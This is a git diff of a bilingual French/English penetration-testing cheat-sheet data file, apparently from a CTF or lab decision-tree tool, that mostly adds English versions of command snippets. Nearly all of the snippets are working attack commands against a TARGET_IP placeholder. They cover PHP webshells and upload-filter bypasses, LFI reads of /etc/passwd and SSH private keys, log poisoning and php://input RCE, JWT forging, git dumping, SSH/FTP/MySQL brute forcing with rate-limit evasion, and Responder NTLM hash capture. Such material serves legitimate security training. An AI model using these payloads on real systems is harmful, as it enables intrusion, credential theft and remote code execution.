@@ -57,10 +57,10 @@ const NODES = {
     description_en: "Identify the technology stack, hidden directories and potential entry points.",
     commands: [
       { label: "Détection technologie", label_en: "Technology detection", cmd: "whatweb http://TARGET_IP\nwappalyzer (extension navigateur)" },
-      { label: "Scan de répertoires (feroxbuster — recommandé)", label_en: "Directory scan (feroxbuster — recommended)", cmd: "# Scan complet — tous les codes HTTP\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o ferox.txt\n\n# Version filtrée — ne garder que 200, 301, 302, 401, 403\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -C 404,500 \\\n  -o ferox.txt" },
-      { label: "Gobuster alternative", label_en: "Gobuster alternative", cmd: "# Scan complet\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o gobuster.txt\n\n# Version filtrée — ignorer 404 et 500\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -b 404,500 \\\n  -o gobuster.txt" },
+      { label: "Scan de répertoires (feroxbuster — recommandé)", label_en: "Directory scan (feroxbuster — recommended)", cmd: "# Scan complet — tous les codes HTTP\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o ferox.txt\n\n# Version filtrée — ne garder que 200, 301, 302, 401, 403\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -C 404,500 \\\n  -o ferox.txt", cmd_en: "# Full scan — all HTTP status codes\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o ferox.txt\n\n# Filtered — keep only 200, 301, 302, 401, 403\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -C 404,500 \\\n  -o ferox.txt" },
+      { label: "Gobuster alternative", label_en: "Gobuster alternative", cmd: "# Scan complet\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o gobuster.txt\n\n# Version filtrée — ignorer 404 et 500\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -b 404,500 \\\n  -o gobuster.txt", cmd_en: "# Full scan\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o gobuster.txt\n\n# Filtered — ignore 404 and 500\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -b 404,500 \\\n  -o gobuster.txt" },
       { label: "Nikto — scan vulnérabilités web", label_en: "Nikto — web vulnerability scan", cmd: "nikto -h http://TARGET_IP -o nikto.txt" },
-      { label: "Fuzzing de vhosts/subdomains", label_en: "Vhost/subdomain fuzzing", cmd: "# Étape 1 — noter la taille de la réponse par défaut (sans filtre)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN'\n\n# Étape 2 — filtrer par la taille par défaut (remplacer WRONG_SIZE)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN' \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
+      { label: "Fuzzing de vhosts/subdomains", label_en: "Vhost/subdomain fuzzing", cmd: "# Étape 1 — noter la taille de la réponse par défaut (sans filtre)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN'\n\n# Étape 2 — filtrer par la taille par défaut (remplacer WRONG_SIZE)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN' \\\n  -fs WRONG_SIZE \\\n  -fc 404,500", cmd_en: "# Step 1 — note the default response size (no filter)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN'\n\n# Step 2 — filter by the default size (replace WRONG_SIZE)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN' \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
       { label: "Robots.txt et sitemap", label_en: "Robots.txt and sitemap", cmd: "curl http://TARGET_IP/robots.txt\ncurl http://TARGET_IP/sitemap.xml" }
     ],
     lookfor: [
@@ -268,7 +268,7 @@ const NODES = {
     description_en: "Attempt to upload a PHP webshell. Bypass type/extension filters.",
     commands: [
       { label: "Webshell PHP minimal", label_en: "Minimal PHP webshell", cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php" },
-      { label: "Webshell PHP complet", label_en: "Full PHP webshell", cmd: "cp /usr/share/webshells/php/php-reverse-shell.php .\n# Modifier IP et PORT" },
+      { label: "Webshell PHP complet", label_en: "Full PHP webshell", cmd: "cp /usr/share/webshells/php/php-reverse-shell.php .\n# Modifier IP et PORT", cmd_en: "cp /usr/share/webshells/php/php-reverse-shell.php .\n# Edit IP and PORT" },
       { label: "Bypass extension — essayer ces extensions", label_en: "Extension bypass — try these extensions", cmd: "shell.php\nshell.php5\nshell.php3\nshell.phtml\nshell.pHp\nshell.PHP\nshell.php.jpg\nshell.jpg.php" },
       { label: "Bypass MIME type avec Burp", label_en: "MIME type bypass with Burp", cmd: "Intercepter l'upload > changer Content-Type: image/jpeg\nmais garder le contenu PHP" },
       { label: "Polyglot JPG+PHP", label_en: "Polyglot JPG+PHP", cmd: "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg" }
@@ -304,11 +304,11 @@ const NODES = {
     description: "Contournements avancés quand les filtres basiques ne suffisent pas.",
     description_en: "Advanced bypass techniques when basic filters are not enough.",
     commands: [
-      { label: "Null byte (anciens serveurs)", label_en: "Null byte (legacy servers)", cmd: "Renommer : shell.php%00.jpg\n# Le serveur tronque après %00" },
+      { label: "Null byte (anciens serveurs)", label_en: "Null byte (legacy servers)", cmd: "Renommer : shell.php%00.jpg\n# Le serveur tronque après %00", cmd_en: "Rename: shell.php%00.jpg\n# The server truncates after %00" },
       { label: "Magic bytes — ajouter header GIF", label_en: "Magic bytes — add GIF header", cmd: "echo 'GIF89a' > shell.php.gif && echo '<?php system($_GET[\"cmd\"]); ?>' >> shell.php.gif" },
-      { label: ".htaccess upload pour forcer exécution PHP", label_en: ".htaccess upload to force PHP execution", cmd: "echo 'AddType application/x-httpd-php .jpg' > .htaccess\n# Puis uploader shell.jpg" },
+      { label: ".htaccess upload pour forcer exécution PHP", label_en: ".htaccess upload to force PHP execution", cmd: "echo 'AddType application/x-httpd-php .jpg' > .htaccess\n# Puis uploader shell.jpg", cmd_en: "echo 'AddType application/x-httpd-php .jpg' > .htaccess\n# Then upload shell.jpg" },
       { label: "Tester SVG avec script", label_en: "Test SVG with script tag", cmd: "echo '<svg><script>alert(1)</script></svg>' > xss.svg" },
-      { label: "Zip slip attack", label_en: "Zip slip attack", cmd: "# Créer une archive avec path traversal\npython3 -c \"import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../var/www/html/shell.php'); z.close()\"" }
+      { label: "Zip slip attack", label_en: "Zip slip attack", cmd: "# Créer une archive avec path traversal\npython3 -c \"import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../var/www/html/shell.php'); z.close()\"", cmd_en: "# Create an archive with path traversal\npython3 -c \"import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../var/www/html/shell.php'); z.close()\"" }
     ],
     lookfor: ["Le serveur accepte-t-il .htaccess ?", "Erreur différente selon l'extension → filtrage par liste blanche vs noire"],
     lookfor_en: ["Does the server accept .htaccess?", "Different error depending on extension → blacklist vs whitelist filtering"],
@@ -325,10 +325,10 @@ const NODES = {
     description: "Un paramètre GET/POST accepte des données — tester injection SQL, LFI, SSTI, commande.",
     description_en: "A GET/POST parameter accepts user input — test for SQLi, LFI, SSTI, command injection.",
     commands: [
-      { label: "Identifier le contexte du paramètre", label_en: "Identify the parameter context", cmd: "# Tester : ?page=../../../../etc/passwd (LFI)\n# Tester : ?id=1' (SQLi)\n# Tester : ?name={{7*7}} (SSTI)\n# Tester : ?host=127.0.0.1;id (CMDi)" },
+      { label: "Identifier le contexte du paramètre", label_en: "Identify the parameter context", cmd: "# Tester : ?page=../../../../etc/passwd (LFI)\n# Tester : ?id=1' (SQLi)\n# Tester : ?name={{7*7}} (SSTI)\n# Tester : ?host=127.0.0.1;id (CMDi)", cmd_en: "# Test: ?page=../../../../etc/passwd (LFI)\n# Test: ?id=1' (SQLi)\n# Test: ?name={{7*7}} (SSTI)\n# Test: ?host=127.0.0.1;id (CMDi)" },
       { label: "Test LFI rapide", label_en: "Quick LFI test", cmd: "curl 'http://TARGET_IP/index.php?page=../../../../etc/passwd'" },
       { label: "Test SQLi rapide", label_en: "Quick SQLi test", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' --dbs --batch" },
-      { label: "Test SSTI", label_en: "SSTI test", cmd: "# Tester dans le paramètre :\n{{7*7}} → 49 = Jinja2/Twig\n${7*7} → 49 = FreeMarker\n<%= 7*7 %> → 49 = ERB (Ruby)" }
+      { label: "Test SSTI", label_en: "SSTI test", cmd: "# Tester dans le paramètre :\n{{7*7}} → 49 = Jinja2/Twig\n${7*7} → 49 = FreeMarker\n<%= 7*7 %> → 49 = ERB (Ruby)", cmd_en: "# Test in the parameter:\n{{7*7}} → 49 = Jinja2/Twig\n${7*7} → 49 = FreeMarker\n<%= 7*7 %> → 49 = ERB (Ruby)" }
     ],
     lookfor: ["Réponse différente avec payload", "Erreur SQL ou stack trace", "Inclusion de fichier dans la réponse"],
     lookfor_en: ["Different response with payload", "SQL error or stack trace", "File inclusion in the response"],
@@ -350,7 +350,7 @@ const NODES = {
       { label: "Lire /etc/passwd", label_en: "Read /etc/passwd", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../etc/passwd'" },
       { label: "Lire clé SSH privée", label_en: "Read SSH private key", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../home/USER/.ssh/id_rsa'" },
       { label: "Lire fichiers config web", label_en: "Read web config files", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../var/www/html/config.php'\ncurl 'http://TARGET_IP/page.php?file=../../../../etc/apache2/sites-enabled/000-default.conf'" },
-      { label: "Log Poisoning — empoisonner /var/log/apache2/access.log", label_en: "Log Poisoning — poison /var/log/apache2/access.log", cmd: "# Injecter PHP dans User-Agent\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET_IP\n# Puis inclure le log\ncurl 'http://TARGET_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id'" },
+      { label: "Log Poisoning — empoisonner /var/log/apache2/access.log", label_en: "Log Poisoning — poison /var/log/apache2/access.log", cmd: "# Injecter PHP dans User-Agent\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET_IP\n# Puis inclure le log\ncurl 'http://TARGET_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id'", cmd_en: "# Inject PHP in User-Agent\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET_IP\n# Then include the log\ncurl 'http://TARGET_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id'" },
       { label: "PHP Filter — lire code source en base64", label_en: "PHP Filter — read source code as base64", cmd: "curl 'http://TARGET_IP/page.php?file=php://filter/convert.base64-encode/resource=config.php'" },
       { label: "Wrapper PHP input (RCE direct)", label_en: "PHP input wrapper (direct RCE)", cmd: "curl -X POST 'http://TARGET_IP/page.php?file=php://input' --data '<?php system(\"id\"); ?>'" }
     ],
@@ -486,10 +486,10 @@ const NODES = {
     description: "JSON Web Tokens mal configurés peuvent être forgés pour obtenir des privilèges élevés.",
     description_en: "Misconfigured JSON Web Tokens can be forged to obtain elevated privileges.",
     commands: [
-      { label: "Décoder le JWT", label_en: "Decode the JWT", cmd: "# Sur jwt.io ou :\necho 'PAYLOAD_PART' | base64 -d" },
-      { label: "Test algorithm none", label_en: "Test algorithm none", cmd: "# Modifier header : {\"alg\":\"none\"}\n# Supprimer la signature\njwt_tool TOKEN -X a" },
+      { label: "Décoder le JWT", label_en: "Decode the JWT", cmd: "# Sur jwt.io ou :\necho 'PAYLOAD_PART' | base64 -d", cmd_en: "# On jwt.io or:\necho 'PAYLOAD_PART' | base64 -d" },
+      { label: "Test algorithm none", label_en: "Test algorithm none", cmd: "# Modifier header : {\"alg\":\"none\"}\n# Supprimer la signature\njwt_tool TOKEN -X a", cmd_en: "# Modify header: {\"alg\":\"none\"}\n# Remove the signature\njwt_tool TOKEN -X a" },
       { label: "Brute force clé secrète faible", label_en: "Brute force weak secret key", cmd: "hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt\njwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt" },
-      { label: "Modifier le payload", label_en: "Modify the payload", cmd: "# Changer role:user → role:admin, puis re-signer\njwt_tool TOKEN -T" }
+      { label: "Modifier le payload", label_en: "Modify the payload", cmd: "# Changer role:user → role:admin, puis re-signer\njwt_tool TOKEN -T", cmd_en: "# Change role:user → role:admin, then re-sign\njwt_tool TOKEN -T" }
     ],
     lookfor: ["Algorithme : HS256, RS256, none", "Claims : role, admin, user_id", "Clé secrète faible dans le code source"],
     lookfor_en: ["Algorithm: HS256, RS256, none", "Claims: role, admin, user_id", "Weak secret key in source code"],
@@ -505,7 +505,7 @@ const NODES = {
     description: "Le dépôt git est accessible publiquement → récupérer le code source et les secrets.",
     description_en: "The git repository is publicly accessible → retrieve source code and secrets.",
     commands: [
-      { label: "Dumper le repo", label_en: "Dump the repo", cmd: "git-dumper http://TARGET_IP/.git ./repo\n# ou : gittools / gitdumper.sh" },
+      { label: "Dumper le repo", label_en: "Dump the repo", cmd: "git-dumper http://TARGET_IP/.git ./repo\n# ou : gittools / gitdumper.sh", cmd_en: "git-dumper http://TARGET_IP/.git ./repo\n# or: gittools / gitdumper.sh" },
       { label: "Analyser les commits", label_en: "Analyze commits", cmd: "cd repo\ngit log --oneline\ngit show COMMIT_HASH" },
       { label: "Chercher secrets dans l'historique", label_en: "Search secrets in history", cmd: "git log -p | grep -i 'password\\|secret\\|key\\|token\\|credential'" },
       { label: "truffleHog — scanner les secrets", label_en: "truffleHog — scan for secrets", cmd: "trufflehog git file://./repo" }
@@ -561,9 +561,9 @@ const NODES = {
     description: "Interface admin permettant d'éditer des fichiers → injecter du code PHP.",
     description_en: "Admin interface allowing file editing → inject PHP code.",
     commands: [
-      { label: "WordPress — éditeur de thème", label_en: "WordPress — theme editor", cmd: "Dashboard > Appearance > Theme Editor\n# Modifier 404.php ou functions.php :\n<?php system($_GET['cmd']); ?>" },
+      { label: "WordPress — éditeur de thème", label_en: "WordPress — theme editor", cmd: "Dashboard > Appearance > Theme Editor\n# Modifier 404.php ou functions.php :\n<?php system($_GET['cmd']); ?>", cmd_en: "Dashboard > Appearance > Theme Editor\n# Edit 404.php or functions.php:\n<?php system($_GET['cmd']); ?>" },
       { label: "Accéder au webshell WordPress", label_en: "Access the WordPress webshell", cmd: "curl 'http://TARGET_IP/wp-content/themes/THEME_NAME/404.php?cmd=id'" },
-      { label: "Drupal — éditeur PHP (si module activé)", label_en: "Drupal — PHP editor (if module enabled)", cmd: "Modules > PHP Filter activé\n# Créer du contenu avec PHP\n<?php system('id'); ?>" }
+      { label: "Drupal — éditeur PHP (si module activé)", label_en: "Drupal — PHP editor (if module enabled)", cmd: "Modules > PHP Filter activé\n# Créer du contenu avec PHP\n<?php system('id'); ?>", cmd_en: "Modules > PHP Filter enabled\n# Create content with PHP\n<?php system('id'); ?>" }
     ],
     lookfor: ["Quel fichier est éditable et exécutable ?"],
     lookfor_en: ["Which file is editable and executable?"],
@@ -579,10 +579,10 @@ const NODES = {
     description: "Rien de trouvé facilement — creuser plus profondément.",
     description_en: "Nothing found easily — dig deeper.",
     commands: [
-      { label: "Wordlists plus grandes", label_en: "Larger wordlists", cmd: "# Scan profond avec extensions étendues\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -o ferox_deep.txt\n\n# Version filtrée — réduire le bruit\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -C 404,500 \\\n  -o ferox_deep.txt" },
-      { label: "Fuzzing de paramètres GET", label_en: "GET parameter fuzzing", cmd: "# Étape 1 — sans filtre pour identifier la taille de réponse par défaut\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt\n\n# Étape 2 — filtrer par taille/code (remplacer WRONG_SIZE)\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
-      { label: "Chercher fichiers de backup", label_en: "Look for backup files", cmd: "# Scan de fichiers sensibles/backup\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404\n\n# Version filtrée — ne garder que les codes intéressants\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404,500 \\\n  -mc 200,301,302,401,403" },
-      { label: "Encoder l'URL si filtres en place", label_en: "URL-encode if filters are in place", cmd: "# Double encoding : ../ → %252e%252e%252f\n# Unicode : ../ → %c0%ae%c0%ae%c0%af" }
+      { label: "Wordlists plus grandes", label_en: "Larger wordlists", cmd: "# Scan profond avec extensions étendues\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -o ferox_deep.txt\n\n# Version filtrée — réduire le bruit\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -C 404,500 \\\n  -o ferox_deep.txt", cmd_en: "# Deep scan with extended extensions\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -o ferox_deep.txt\n\n# Filtered — reduce noise\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -C 404,500 \\\n  -o ferox_deep.txt" },
+      { label: "Fuzzing de paramètres GET", label_en: "GET parameter fuzzing", cmd: "# Étape 1 — sans filtre pour identifier la taille de réponse par défaut\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt\n\n# Étape 2 — filtrer par taille/code (remplacer WRONG_SIZE)\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt \\\n  -fs WRONG_SIZE \\\n  -fc 404,500", cmd_en: "# Step 1 — no filter to identify the default response size\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt\n\n# Step 2 — filter by size/code (replace WRONG_SIZE)\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
+      { label: "Chercher fichiers de backup", label_en: "Look for backup files", cmd: "# Scan de fichiers sensibles/backup\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404\n\n# Version filtrée — ne garder que les codes intéressants\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404,500 \\\n  -mc 200,301,302,401,403", cmd_en: "# Scan for sensitive/backup files\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404\n\n# Filtered — keep only interesting status codes\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404,500 \\\n  -mc 200,301,302,401,403" },
+      { label: "Encoder l'URL si filtres en place", label_en: "URL-encode if filters are in place", cmd: "# Double encoding : ../ → %252e%252e%252f\n# Unicode : ../ → %c0%ae%c0%ae%c0%af", cmd_en: "# Double encoding: ../ → %252e%252e%252f\n# Unicode: ../ → %c0%ae%c0%ae%c0%af" }
     ],
     lookfor: ["Fichiers .bak, .old, .backup, ~", "Répertoires cachés avec noms inhabituels"],
     lookfor_en: ["Files with .bak, .old, .backup, ~ extensions", "Hidden directories with unusual names"],
@@ -599,8 +599,8 @@ const NODES = {
     description: "L'application limite les tentatives — techniques de contournement.",
     description_en: "The application limits attempts — bypass techniques.",
     commands: [
-      { label: "Modifier le header X-Forwarded-For", label_en: "Modify the X-Forwarded-For header", cmd: "hydra ... -H 'X-Forwarded-For: FUZZ'\n# Ou via Burp avec header X-Originating-IP, X-Remote-IP" },
-      { label: "Rotation d'IPs avec proxychains", label_en: "IP rotation with proxychains", cmd: "# Configurer proxychains avec liste de proxys\nproxychains hydra ..." },
+      { label: "Modifier le header X-Forwarded-For", label_en: "Modify the X-Forwarded-For header", cmd: "hydra ... -H 'X-Forwarded-For: FUZZ'\n# Ou via Burp avec header X-Originating-IP, X-Remote-IP", cmd_en: "hydra ... -H 'X-Forwarded-For: FUZZ'\n# Or via Burp with header X-Originating-IP, X-Remote-IP" },
+      { label: "Rotation d'IPs avec proxychains", label_en: "IP rotation with proxychains", cmd: "# Configurer proxychains avec liste de proxys\nproxychains hydra ...", cmd_en: "# Configure proxychains with a proxy list\nproxychains hydra ..." },
       { label: "Réduire la vitesse", label_en: "Slow down the attack", cmd: "hydra -t 1 -W 10 ..." }
     ],
     lookfor: ["Headers de rate limiting dans la réponse", "Durée du ban"],
@@ -622,7 +622,7 @@ const NODES = {
       { label: "Version SSH", label_en: "SSH version", cmd: "nmap -sV -p 22 TARGET_IP\nssh -V TARGET_IP" },
       { label: "Banner grabbing", label_en: "Banner grabbing", cmd: "nc -nv TARGET_IP 22" },
       { label: "Chercher CVEs pour la version", label_en: "Search CVEs for the version", cmd: "searchsploit openssh 7.2\nsearchsploit libssh" },
-      { label: "Tester credentials évidents", label_en: "Test obvious credentials", cmd: "ssh root@TARGET_IP\nssh admin@TARGET_IP\n# Mots de passe : root, admin, password, toor" },
+      { label: "Tester credentials évidents", label_en: "Test obvious credentials", cmd: "ssh root@TARGET_IP\nssh admin@TARGET_IP\n# Mots de passe : root, admin, password, toor", cmd_en: "ssh root@TARGET_IP\nssh admin@TARGET_IP\n# Passwords: root, admin, password, toor" },
       { label: "Énumération d'utilisateurs (CVE-2018-15473)", label_en: "User enumeration (CVE-2018-15473)", cmd: "python3 ssh_user_enum.py --userList /usr/share/metasploit-framework/data/wordlists/unix_users.txt --port 22 TARGET_IP" }
     ],
     lookfor: [
@@ -659,7 +659,7 @@ const NODES = {
       { label: "Hydra SSH", label_en: "Hydra SSH", cmd: "hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4" },
       { label: "Hydra avec liste d'users", label_en: "Hydra with user list", cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4" },
       { label: "Medusa SSH", label_en: "Medusa SSH", cmd: "medusa -h TARGET_IP -u USERNAME -P /usr/share/wordlists/rockyou.txt -M ssh" },
-      { label: "Générer wordlist ciblée", label_en: "Generate targeted wordlist", cmd: "cewl http://TARGET_IP -d 3 -m 5 -w cewl_wordlist.txt\n# Puis utiliser avec hydra" }
+      { label: "Générer wordlist ciblée", label_en: "Generate targeted wordlist", cmd: "cewl http://TARGET_IP -d 3 -m 5 -w cewl_wordlist.txt\n# Puis utiliser avec hydra", cmd_en: "cewl http://TARGET_IP -d 3 -m 5 -w cewl_wordlist.txt\n# Then use with hydra" }
     ],
     lookfor: ["Message [22][ssh] host: ... login: ... password: ..."],
     lookfor_en: ["Message [22][ssh] host: ... login: ... password: ..."],
@@ -685,7 +685,7 @@ const NODES = {
     commands: [
       { label: "Connexion avec clé", label_en: "Connect with key", cmd: "chmod 600 id_rsa\nssh -i id_rsa USER@TARGET_IP" },
       { label: "Cracker passphrase de la clé", label_en: "Crack the key passphrase", cmd: "ssh2john id_rsa > hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
-      { label: "Identifier le propriétaire", label_en: "Identify the owner", cmd: "# Regarder le commentaire en fin de clé publique\ncat id_rsa.pub" }
+      { label: "Identifier le propriétaire", label_en: "Identify the owner", cmd: "# Regarder le commentaire en fin de clé publique\ncat id_rsa.pub", cmd_en: "# Check the comment at the end of the public key\ncat id_rsa.pub" }
     ],
     lookfor: ["La clé est-elle protégée par passphrase ?", "Quel utilisateur correspond à cette clé ?"],
     lookfor_en: ["Is the key protected by a passphrase?", "Which user does this key belong to?"],
@@ -704,7 +704,7 @@ const NODES = {
     description: "Vérifier l'accès anonyme, la version, les fichiers disponibles.",
     description_en: "Check anonymous access, version and available files.",
     commands: [
-      { label: "Test login anonyme", label_en: "Test anonymous login", cmd: "ftp TARGET_IP\n# Login: anonymous\n# Password: anonymous ou email@test.com" },
+      { label: "Test login anonyme", label_en: "Test anonymous login", cmd: "ftp TARGET_IP\n# Login: anonymous\n# Password: anonymous ou email@test.com", cmd_en: "ftp TARGET_IP\n# Login: anonymous\n# Password: anonymous or email@test.com" },
       { label: "Nmap scripts FTP", label_en: "Nmap FTP scripts", cmd: "nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor TARGET_IP" },
       { label: "Liste fichiers récursive", label_en: "Recursive file listing", cmd: "ftp> ls -la\nftp> ls -R" },
       { label: "Télécharger tous les fichiers", label_en: "Download all files", cmd: "wget -r ftp://anonymous:anonymous@TARGET_IP/" }
@@ -821,7 +821,7 @@ const NODES = {
     description_en: "Capture NTLM hashes via Responder for cracking or pass-the-hash.",
     commands: [
       { label: "Lancer Responder", label_en: "Start Responder", cmd: "sudo responder -I tun0 -dwPv" },
-      { label: "Déclencher la capture (si écriture SMB)", label_en: "Trigger the capture (if SMB write access)", cmd: "# Créer fichier .scf ou .lnk pointant vers votre IP\n# Le client Windows essaiera de s'authentifier automatiquement" },
+      { label: "Déclencher la capture (si écriture SMB)", label_en: "Trigger the capture (if SMB write access)", cmd: "# Créer fichier .scf ou .lnk pointant vers votre IP\n# Le client Windows essaiera de s'authentifier automatiquement", cmd_en: "# Create a .scf or .lnk file pointing to your IP\n# The Windows client will try to authenticate automatically" },
       { label: "Cracker le hash NTLMv2", label_en: "Crack the NTLMv2 hash", cmd: "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt" }
     ],
     lookfor: ["Hash NTLMv2 capturé dans Responder output"],
@@ -860,7 +860,7 @@ const NODES = {
     description: "MySQL exposé — tenter connexion sans auth ou credentials faibles.",
     description_en: "Exposed MySQL — try connecting without auth or with weak credentials.",
     commands: [
-      { label: "Connexion root sans password", label_en: "Root connection without password", cmd: "mysql -h TARGET_IP -u root -p\n# Tenter password vide, ou 'root', 'mysql', 'password'" },
+      { label: "Connexion root sans password", label_en: "Root connection without password", cmd: "mysql -h TARGET_IP -u root -p\n# Tenter password vide, ou 'root', 'mysql', 'password'", cmd_en: "mysql -h TARGET_IP -u root -p\n# Try empty password, or 'root', 'mysql', 'password'" },
       { label: "Nmap scripts MySQL", label_en: "Nmap MySQL scripts", cmd: "nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases TARGET_IP" },
       { label: "Lister les bases de données", label_en: "List databases", cmd: "SHOW DATABASES;\nUSE mysql;\nSELECT user,password FROM user;" },
       { label: "Lire fichiers système (si FILE privilege)", label_en: "Read system files (if FILE privilege)", cmd: "SELECT LOAD_FILE('/etc/passwd');\nSELECT LOAD_FILE('/var/www/html/config.php');" },
@@ -982,10 +982,10 @@ const NODES = {
     description: "Utiliser une CVE connue pour le service identifié.",
     description_en: "Use a known CVE for the identified service.",
     commands: [
-      { label: "Chercher des exploits", label_en: "Search for exploits", cmd: "searchsploit SERVICE VERSION\n# Ex: searchsploit apache 2.4.49" },
-      { label: "Copier l'exploit", label_en: "Copy the exploit", cmd: "searchsploit -m EXPLOIT_ID\n# Examiner le code avant d'exécuter !" },
